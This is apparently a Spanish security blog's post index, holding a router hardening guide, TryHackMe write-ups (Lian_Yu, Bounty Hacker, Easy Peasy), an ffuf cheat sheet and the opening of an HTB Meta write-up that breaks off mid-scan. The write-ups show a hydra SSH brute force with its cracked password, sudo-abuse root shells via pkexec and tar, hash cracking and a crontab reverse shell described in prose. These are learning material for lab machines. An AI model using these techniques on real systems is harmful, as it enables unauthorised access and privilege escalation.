[ { "title": "[BRS] Proyecto 8", "url": "/notes/brs/proyecto_8", "categories": "Notes, BRS", "tags": "curso, brs, spanish, router, hardening", "date": "2023-02-13 13:00:00 +0100", "snippet": "Guía de hardeningAjustes por defectoContraseña/SSIDDe forma opcional podríamos modificar el SSID de nuestro punto de acceso, aparte debemos poner el SSID oculto para evitar de una forma general el intento de inicios de sesión.También tendremos que modificar la contraseña por defecto a una que cumpla con los requisitos mínimos de seguridad. Wireless SettingsGuest networkAl igual que hemos modificado los ajustes por defecto de la red “normal” lo haremos de la de invitados.Volveremos a usar una contraseña segura y SSID oculto. Guest Settings Usar un gestor de contraseñas puede facilitar el uso de contraseñas más seguras.Habilitar un horario del WirelessEsto puede ayudar a evitar conexiones en un horario que no estamos despiertos o en casa.Time Schedule Por ejemplo, de L-V de 1:00-6:00 AMDeshabilitar WPSEn caso de que alguien tenga acceso físico a nuestro router puede llegar a usar WPS para realizar la conexión desde su dispositivo sin ningún problema. Esto se puede evitar desactivando WPS en la configuración de nuestro router.WPSConfiguración de redReducimos la pool DHCP para tener un mayor control sobre los dispositivos que tenemos conectados en la red. DHCPConfiguración del routerActualización del softwareCómo en cualquier dispositivo tendremos que mantener el software actualizado para evitar problemas que pudieran haber en términos de seguridad. UpdateConfiguración generalContraseña routerCambiar la contraseña de administración del router es de los pasos más importantes a la hora de securizar nuestro router. Los router dependiendo del modelo y fabricante suelen tener un usuario y contraseña por defecto que se puede encontrar en Internet facilmente.Administración localAsignar un único o varios dispositivos de confianza es muy buena opción. Por ejemplo podemos añadir nuestro equipo personal como único dispositivo que puede tener acceso al panel de administración definiendo su MAC.Chequeo RefererSi habilitamos la comprobación de la cabecera Referer podemos evitar en cierta medida ataques CSRF. Various optionsCon esto habremos mejorado bastante la seguridad de nuestro router. Faltaría protección DDOS, filtrado de MAC… eso ya depende del software de nuestro router.Sources Guía de usuario" }, { "title": "[THM] Lian_Yu", "url": "/machines/thm/lianyu", "categories": "Machines, THM", "tags": "easy, linux, machines, ftp, curso, stego", "date": "2023-01-17 17:40:00 +0100", "snippet": "EnumerationNMAPIdentificamos puertos abiertos y servicios expuestos en la red. Esta vez con –top-ports para ver los más usados y aligerar el proceso.# Nmap 7.93 scan initiated Tue Jan 17 12:48:42 2023 as: nmap -sV -sC --top-ports 100 -oN ports 10.10.0.220Nmap scan report for 10.10.0.220Host is up (0.20s latency).Not shown: 96 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.222/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)| ssh-hostkey: | 1024 5650bd11efd4ac5632c3ee733ede87f4 (DSA)| 2048 396f3a9cb62dad0cd86dbe77130725d6 (RSA)| 256 a66996d76d6127967ebb9f83601b5212 (ECDSA)|_ 256 3f437675a85aa6cd33b066420491fea0 (ED25519)80/tcp open http Apache httpd|_http-title: Purgatory|_http-server-header: Apache111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100000 3,4 111/tcp6 rpcbind| 100000 3,4 111/udp6 rpcbind| 100024 1 33073/tcp6 status| 100024 1 41845/udp6 status| 100024 1 42521/udp status|_ 100024 1 51975/tcp statusService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Encontramos un ftp, ssh, apache y rpc.FuzzingHacemos fuzzing al Apache ya que no hay nada que podamos hacer en los otros servicios. El index contiene lo siguiente: index.htmlAl hacer fuzzing a la “raíz” del sitio web encontramos el directorio /island.$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.0.220/FUZZ -ic -c /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://10.10.0.220/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500________________________________________________ [Status: 200, Size: 2506, Words: 365, Lines: 60, Duration: 539ms]island [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 507ms]Vemos como nos da una palabra clave la cuál es vigilante. Página islandSi hacemos fuzz dentro del directorio /island encontramos otro el cuál es /2100.$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.0.220/island/FUZZ -ic -c /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://10.10.0.220/island/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500________________________________________________ [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 415ms]2100 [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 302ms]En esta página nos dicen que podemos encontrar un .ticket ahí. Source code 2100Para buscar ese archivo haremos fuzzing añadiendo la extensión.$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.0.220/island/2100/FUZZ.ticket -ic -c /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://10.10.0.220/island/2100/FUZZ.ticket :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500________________________________________________green_arrow [Status: 200, Size: 71, Words: 10, Lines: 7, Duration: 52ms] : falseAquí podremos encontrar nuestra contraseña al FTP. Habría que descifrarlo desde Base58. Contenido del ticketFootholdFTPAhora ya podemos pasar al FTP y SSH respectivamente.Usamos el usuario obtenido en /island y la pass del .ticket. Una vez dentro veremos 3 imagenes las cuáles descargaremos usando get.$ ftp vigilante@10.10.0.220Connected to 10.10.0.220.220 (vsFTPd 3.0.2)331 Please specify the password.Password: 230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&amp;gt; ls229 Entering Extended Passive Mode (|||55210|).150 Here comes the directory listing.-rw-r--r-- 1 0 0 511720 May 01 2020 Leave_me_alone.png-rw-r--r-- 1 0 0 549924 May 05 2020 Queen&#39;s_Gambit.png-rw-r--r-- 1 0 0 191026 May 01 2020 aa.jpg226 Directory send OK.StegoVeremos como la imagen llamada Leave_me_alone esta corrupta y no podemos ver lo que es la imagen en sí por lo que usaremos hexeditor para modificar la cabecera hexadecimal al tipo de archivo que le corresponde. Antes de editar EditadoUna vez editada los llamados magic numbers. Ya seremos capaces de ver la imagen, la que nos da una password literalmente.Esta la vamos a usar haciendo steghide a la imagen aa.jpg con el passphrase de la imagen anterior.Al extraer el contenido de esta imagen nos dan dos ficheros:This is your visa to Land on Lian_Yu # Just for Fun ***a small Note about itHaving spent years on the island, Oliver learned how to be resourceful and set booby traps all over the island in the common event he ran into dangerouspeople. The island is also home to many animals, including pheasants,wild pigs and wolves. Texto de relleno…M3******* Esto tiene mejor pinta…SSHIniciamos con S, este lo conseguiremos mirando algo mejor en el FTP. Como contraseña usamos lo que encontramos en el archivo shado.$ ssh s****@10.10.20.106s****@10.10.20.106&#39;s password: Way To SSH... Loading.........Done.. Connecting To Lian_Yu Happy Hacking██╗ ██╗███████╗██╗ ██████╗ ██████╗ ███╗ ███╗███████╗██████╗ ██║ ██║██╔════╝██║ ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗██║ █╗ ██║█████╗ ██║ ██║ ██║ ██║██╔████╔██║█████╗ █████╔╝██║███╗██║██╔══╝ ██║ ██║ ██║ ██║██║╚██╔╝██║██╔══╝ ██╔═══╝ ╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗ ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝ ╚═╝╚══════╝╚══════╝ ██╗ ██╗ █████╗ ███╗ ██╗ ██╗ ██╗██╗ ██╗ ██║ ██║██╔══██╗████╗ ██║ ╚██╗ ██╔╝██║ ██║ ██║ ██║███████║██╔██╗ ██║ ╚████╔╝ ██║ ██║ ██║ ██║██╔══██║██║╚██╗██║ ╚██╔╝ ██║ ██║ ███████╗██║██║ ██║██║ ╚████║███████╗██║ ╚██████╔╝ ╚══════╝╚═╝╚═╝ ╚═╝╚═╝ ╚═══╝╚══════╝╚═╝ ╚═════╝ #s****@LianYu:~$ lsuser.txts****@LianYu:~$ cat user.txt THM{**********} --Felicity SmoakPrivilege EscalationLo primero que se hace al iniciar una escalada es sudo -l para ver que se puede usar como root. En este caso encontramos /usr/bin/pkexec.s****@LianYu:~$ sudo -lMatching Defaults entries for s**** on LianYu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser s**** may run the following commands on LianYu: (root) PASSWD: /usr/bin/pkexecConsultando GTFOBins vemos que se puede aprovechar que pkexec se ejecute como root usando el siguiente comando.sudo pkexec /bin/shUna vez hecho esto ya seremos root.s****@LianYu:~$ sudo pkexec /bin/sh# lsroot.txt# cat root.txt Mission accomplishedYou are injected me with Mirakuru:) ---&amp;gt; Now s**** Will become DEATHSTROKE.THM{**********} --DEATHSTROKEConclusionIniciación a máquinas vulnerables.Techniques and Tools nmap ffuf steghide hexeditor PE (Privilege Escalation)" }, { "title": "[THM] Bounty Hacker", "url": "/machines/thm/bountyhacker", "categories": "Machines, THM", "tags": "easy, linux, machines, ftp, curso, hydra", "date": "2023-01-10 13:30:00 +0100", "snippet": "EnumerationNMAPComo siempre iniciamos la máquina identificando puertos abiertos y servicios expuestos en la red.Nmap scan report for 10.10.207.103Host is up (0.28s latency).Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (conn-refused)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3| ftp-anon: Anonymous FTP login allowed (FTP code 230)| -rw-rw-r-- 1 ftp ftp 418 Jun 07 2020 locks.txt|_-rw-rw-r-- 1 ftp ftp 68 Jun 07 2020 task.txt| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10.8.46.198| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 3| vsFTPd 3.0.3 - secure, fast, stable|_End of status22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 dcf8dfa7a6006d18b0702ba5aaa6143e (RSA)| 256 ecc0f2d91e6f487d389ae3bb08c40cc9 (ECDSA)|_ 256 a41a15a5d4b1cf8f16503a7dd0d813c2 (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-title: Site doesn&#39;t have a title (text/html).|_http-server-header: Apache/2.4.18 (Ubuntu)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Encontramos un ftp, ssh y apache.FootholdFTPComenzamos por el FTP ya que gracias a los script por defecto de nmap se ha podido ver que tiene habilitado el acceso por “anonymous”. También se puede observar que hay dos archivos en su interior, los cuales vamos a descargar.$ ftp anonymous@10.10.207.103Connected to 10.10.207.103.220 (vsFTPd 3.0.3)230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&amp;gt; passivePassive mode: off; fallback to active mode: off.ftp&amp;gt; ls200 EPRT command successful. Consider using EPSV.150 Here comes the directory listing.-rw-rw-r-- 1 ftp ftp 418 Jun 07 2020 locks.txt-rw-rw-r-- 1 ftp ftp 68 Jun 07 2020 task.txt226 Directory send OK.ftp&amp;gt; get locks.txtlocal: locks.txt remote: locks.txt200 EPRT command successful. Consider using EPSV.150 Opening BINARY mode data connection for locks.txt (418 bytes).100% |************************************************************************************************************************************************| 418 1.12 MiB/s 00:00 ETA226 Transfer complete.418 bytes received in 00:00 (5.06 KiB/s)ftp&amp;gt; get task.txtlocal: task.txt remote: task.txt200 EPRT command successful. Consider using EPSV.150 Opening BINARY mode data connection for task.txt (68 bytes).100% |************************************************************************************************************************************************| 68 88.89 KiB/s 00:00 ETA226 Transfer complete.68 bytes received in 00:00 (0.85 KiB/s)ftp&amp;gt; exit221 Goodbye.Los archivos contenian lo siguiente:1.) Protect Vicious.2.) Plan for Red Eye pickup on the moon.-linrEddrAGONReDdr4g0nSynd!cat3Dr@gOn$yn9icat3R3DDr46ONSYndIC@TeReddRA60NR3dDrag0nSynd1c4tedRa6oN5YNDiCATEReDDR4g0n5ynDIc4teR3Dr4gOn2044RedDr4gonSynd1cat3R3dDRaG0Nsynd1c@T3Synd1c4teDr@g0nreddRAg0NREddRaG0N5yNdIc47eDra6oN$yndIC@t34L1mi6H71StHeB357rEDdragOn$ynd1c473DrAgoN5ynD1cATEReDdrag0n$ynd1cateDr@gOn$yND1C4TeRedDr@gonSyn9ic47eREd$yNdIc47edr@goN5YNd1c@73rEDdrAGOnSyNDiCat3r3ddr@g0NReDSynd1ca7e Aquí vemos algo que podemos dar por hecho que es un diccionario.SSHUsando hydra le daremos uso al archivo locks.txt que encontramos en el ftp anterior. Haremos fuerza bruta usando este archivo como diccionario y especificando el usuario lin.$ hydra -l lin -P locks.txt 10.10.207.103 sshHydra v9.4 (c) 2022 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-10 13:35:08[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task[DATA] attacking ssh://10.10.207.103:22/[22][ssh] host: 10.10.207.103 login: lin password: RedDr4gonSynd1cat31 of 1 target successfully completed, 1 valid password foundUna vez obtenida la contraseña iniciamos por ssh. Ya tendremos la flag de USER$ ssh lin@10.10.207.103 lin@10.10.207.103&#39;s password: Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage83 packages can be updated.0 updates are security updates.Last login: Tue Jan 10 06:07:43 2023 from 10.8.46.198lin@bountyhacker:~/Desktop$ cat user.txt THM{**********}Privilege EscalationLo primero que se hace al iniciar una escalada es sudo -l para ver que se puede usar como root. En este caso encontramos /bin/tar.lin@bountyhacker:~$ sudo -l[sudo] password for lin: Matching Defaults entries for lin on bountyhacker: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser lin may run the following commands on bountyhacker: (root) /bin/tarConsultando GTFOBins vemos que se puede aprovechar que tar se ejecute como root usando el siguiente comando.sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/shUna vez hecho esto ya seremos root.lin@bountyhacker:~$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/shtar: Removing leading `/&#39; from member names# cd /rootcd: not found# cd /root# cat root.txtTHM{**********}ConclusionIniciación a máquinas vulnerables.Techniques and Tools nmap hydra PE (Privilege Escalation)" }, { "title": "[THM] Easy Peasy", "url": "/machines/thm/easypeasy", "categories": "Machines, THM", "tags": "easy, linux, machines, ffuf, curso", "date": "2022-12-14 19:30:00 +0100", "snippet": "EnumerationNMAPPara empezar veremos los puertos que tenemos accesibles, para esto usamos nmap a todos los puertos.$ nmap -sV -sC -p- -oN ports 10.10.93.173Nmap scan report for 10.10.93.173Host is up (0.089s latency).Not shown: 65532 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION80/tcp open http nginx 1.16.1| http-robots.txt: 1 disallowed entry |_/|_http-title: Welcome to nginx!|_http-server-header: nginx/1.16.16498/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 304a2b22acd95609f2da122057f46cd4 (RSA)| 256 bf86c9c7b7ef8c8bb994ae0188c0854d (ECDSA)|_ 256 a172ef6c812913ef5a6c24034cfe3d0b (ED25519)65524/tcp open http Apache httpd 2.4.43 ((Ubuntu))| http-robots.txt: 1 disallowed entry |_/|_http-title: Apache2 Debian Default Page: It works|_http-server-header: Apache/2.4.43 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelFuzzingAhora realizamos fuzzing a los directorios después de ver que en robots.txt no hay nada interesante. La herramienta que usaré es ffuf.$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.10.226.197/FUZZ -ic -c /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://10.10.226.197/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500________________________________________________ [Status: 200, Size: 612, Words: 79, Lines: 26, Duration: 54ms]hidden [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 49ms]:: Progress: [22089/87651] :: Job [1/1] :: 429 req/sec :: Duration: [0:00:33] :: Errors: 0 : Vemos un directorio interesante…En ese directorio no se encontraba nada excepto una imagen. Seguiremos con ffuf, pero esta vez haremos fuzzing dentro del directorio /hidden.$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.10.226.197/hidden/FUZZ -ic -c /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://10.10.226.197/hidden/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500________________________________________________ [Status: 200, Size: 390, Words: 47, Lines: 19, Duration: 53ms]whatever [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 48ms]:: Progress: [39589/87651] :: Job [1/1] :: 767 req/sec :: Duration: [0:00:53] :: Errors: 0 :: Aquí empezamos con cosas más llamativas en el source code.FootholdPrimera flagEsta la encontraremos como he mencionado antes en el código fuente de la web, en concreto en el directorio /hidden/whatever. Es una simple imagen, pero si miramos el código…Aquí vemos una etiqueta con el atributo hidden el cuál contiene un texto encriptado en formato base64.Para desencriptarlo lo haremos directamente con terminal de la siguiente forma.$ echo &quot;ZmxhZ3tmMXJzN19mbDRnfQ==&quot; | base64 -d flag{**********}Segunda flagAparte de esa primera página tenemos que recordar que con nmap también vimos que el servicio apache está abierto en el puerto 65524. Entraremos desde el navegador a ver si se encuentra algo.Al entrar nos encontramos con el index por defecto de apache, revisaremos robots.txt y código fuente.Dentro del fichero robots.txt tenemos algo que llama la atención como User-Agent.User-Agent:*Disallow:/Robots Not AllowedUser-Agent:a18672860d0510e5ab6699730763b250Allow:/This Flag Can Enter But Only This Flag No More ExceptionsEse hash lo copiaremos y lo pasaremos por hash-identifier para saber que tipo de hash estamos tratando.$ hash-identifier a18672860d0510e5ab6699730763b250 ######################################################################### # __ __ __ ______ _____ # # /\\ \\/\\ \\ /\\ \\ /\\__ _\\ /\\ _ `\\ # # \\ \\ \\_\\ \\ __ ____ \\ \\ \\___ \\/_/\\ \\/ \\ \\ \\/\\ \\ # # \\ \\ _ \\ /&#39;__`\\ / ,__\\ \\ \\ _ `\\ \\ \\ \\ \\ \\ \\ \\ \\ # # \\ \\ \\ \\ \\/\\ \\_\\ \\_/\\__, `\\ \\ \\ \\ \\ \\ \\_\\ \\__ \\ \\ \\_\\ \\ # # \\ \\_\\ \\_\\ \\___ \\_\\/\\____/ \\ \\_\\ \\_\\ /\\_____\\ \\ \\____/ # # \\/_/\\/_/\\/__/\\/_/\\/___/ \\/_/\\/_/ \\/_____/ \\/___/ v1.2 # # By Zion3R # # www.Blackploit.com # # Root@Blackploit.com # #########################################################################--------------------------------------------------Possible Hashs:[+] MD5[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username))) Nos da 2 posibilidades pero la que es más común es el MD5.Si vamos probando por páginas de crack de hashes puede que nos lleve un rato por eso recomiendo que la búsqueda del hash sea directamente en el buscador. Así nos devolvera páginas de crackear hashes que ya la tengan registrada en la base de datos.Tercera flagPara esta será algo tan sencillo como hacer CTRL+F en el código fuente del index del apache, y buscar por ‘flag’. Directamente aparecerá en texto plano la flag para introducirla como tercera flag.Cuarta flagEn este caso seguiremos buscando en el código fuente y como para el anterior buscaremos, pero esta vez por ‘hidden’, con esto encontraremos otro párrafo oculto, contiene lo siguiente:its encoded with ba....:ObsJmP173N2X6dOrAgEAL0VuEs otro texto en base, ahora es base62.Para su desencriptación usaremos Cyberchef la cuál es una muy buena página para temas de criptografía como este.Quinta flagEntrando al directorio encontrado en la cuarta “flag”, podemos ver lo siguiente:Si le echamos un vistazo al source code, encontramos otro hash y una imagen.&amp;lt;center&amp;gt;&amp;lt;img src=&quot;binarycodepixabay.jpg&quot; width=&quot;140px&quot; height=&quot;140px&quot;/&amp;gt;&amp;lt;p&amp;gt;940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81&amp;lt;/p&amp;gt;&amp;lt;/center&amp;gt;Descargaremos la imagen y copiaremos el hash a un archivo para poder tratar de una mejor forma. La imagen la dejaremos para luego, ahora nos pondremos con el hash.Introducimos el valor del hash en un archivo.$ echo &quot;940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81&quot; &amp;gt; hash.txt En TryHackMe tendremos que descargar un diccionario que nos proporcionanUsaremos john para crackear este hash, el formato será GOST ya que no sabemos realmente con qué tratamos.El comando y la salida de este es:$ john --wordlist=easypeasy.txt --format=gost hash.txtUsing default input encoding: UTF-8Loaded 1 password hash (gost, GOST R 34.11-94 [64/64])Will run 4 OpenMP threadsPress &#39;q&#39; or Ctrl-C to abort, almost any other key for statusmypasswordforthatjob (?) 1g 0:00:00:00 DONE (2022-12-15 08:52) 12.50g/s 51200p/s 51200c/s 51200C/s vgazoom4x..flash88Use the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed. Sexta flagAntes descargamos la imagen que había en el directorio oculto del Apache, ahora usaremos steghide porque lo más probable es que la anterior contraseña que hemos extraído del hash sea la passphrase de datos ocultos dentro de la imagen utilizado técnicas de esteganografía.$ steghide extract -sf flag.jpeg -p mypasswordforthatjobwrote extracted data to &quot;secrettext.txt&quot;.Vemos como se ha extraído datos ocultos, este contiene lo siguiente:username:boringpassword:01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001Pasaremos el binario a texto en mi caso he usado binarytotext.net.Séptima flagTendremos que iniciar ssh con las credenciales que tenemos, y revisar en la carpeta personal del usuario por la flag.Vemos que viene una flag pero está rara, esta cifrada con Caesar con una rotación de 13 posiciones, también llamado ROT13. Si usamos dcode.fr para desencriptarlo veremos que nos devuelve la flag.Con esto habríamos completado todas las respuestas de la máquina excepto la última que se dejará para más adelante.Privilege EscalationPara esto revisaremos los puntos más básicos, como el sudo -l, directorio /tmp y en este caso el que nos va a dar la escalada va a ser el crontab de este sistema. Como podemos ver nos avisa de que se ejecutará como root todo lo que se ejecute vía crontab. En mi caso añado una reverse shell con netcat.Al dejar netcat escuchando y haber añadido la línea que genera la conexión a la reverse shell en crontab sólo quedará esperar.ConclusionUna máquina de iniciación que toca varias ramas al estilo CTF.Techniques and Tools nmap ffuf steghide john RCE (Remote Code Execution) PE (Privilege Escalation)" }, { "title": "[Notes] Ffuf Cheatsheet", "url": "/notes/web/Ffuf", "categories": "Notes, Web", "tags": "ffuf, web, tools, cheatsheet, linux", "date": "2022-06-06 18:30:00 +0200", "snippet": " Command Description ffuf -h ffuf help ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ Directory Fuzzing ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ Extension Fuzzing ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php Page Fuzzing ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v Recursive Fuzzing ffuf -w wordlist.txt:FUZZ -u https://FUZZ.domain.com/ Sub-domain Fuzzing ffuf -w wordlist.txt:FUZZ -u http://domain.com:PORT/ -H &#39;Host: FUZZ.domain.com&#39; -fs xxx VHost Fuzzing ffuf -w wordlist.txt:FUZZ -u http://sub.domain.com:PORT/admin/admin.php?FUZZ=key -fs xxx Parameter Fuzzing - GET ffuf -w wordlist.txt:FUZZ -u http://sub.domain.com:PORT/admin/admin.php -X POST -d &#39;FUZZ=key&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -fs xxx Parameter Fuzzing - POST ffuf -w ids.txt:FUZZ -u http://sub.domain.com:PORT/admin/admin.php -X POST -d &#39;id=FUZZ&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -fs xxx Value Fuzzing Wordlists Command Description /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt Directory/Page Wordlist /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt Extensions Wordlist /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt Domain Wordlist /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt Parameters Wordlist Misc Command Description sudo sh -c &#39;echo &quot;SERVER_IP domain.com&quot; &amp;gt;&amp;gt; /etc/hosts&#39; Add DNS entry for i in $(seq 1 1000); do echo $i &amp;gt;&amp;gt; ids.txt; done Create Sequence Wordlist curl http://sub.domain.com:PORT/admin/admin.php -X POST -d &#39;id=key&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39; curl w/ POST Sources HTB Academy" }, { "title": "[HTB] Meta", "url": "/machines/htb/meta", "categories": "Machines, HTB", "tags": "medium, linux, machines, imagemagick, exiftool", "date": "2022-06-02 21:10:00 +0200", "snippet": "EnumerationRustmapTo use others tools, I found Rustscan which optimizes the scan, by first looking at open ports and then scanning those ports specifically.❯ rustscan -a 10.10.11.140.----. .-. .-. .----..---. .----. .---. .--. .-. .-.| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| || .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ |`-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39;The Modern Day Port Scanner.[~] The config file is expected to be at &quot;/home/isntma/.rustscan.toml&quot;Open 10.10.11.140:22Open 10.10.11.140:80[~] Starting Script(s)[&amp;gt;] Script to be run Some(&quot;nmap -vvv -p &quot;)[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 12:04 CESTInitiating Ping Scan at 12:04Scanning 10.10.11.140 [2 ports]Initiating Connect Scan at 12:04Scanning 10.10.11.140 [2 ports]Discovered open port 80/tcp on 10.10.11.140Discovered open port 22/tcp on 10.10.11.140Completed Connect Scan at 12:04, 0.10s elapsed (2 total ports)Nmap scan report for 10.10.11.140Host is up, received syn-ack (0.058s latency).Scanned at 2022-06-04 12:04:22 CEST for 1sPORT STATE SERVICE REASON22/tcp open ssh syn-ack80/tcp open http syn-ackRead data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 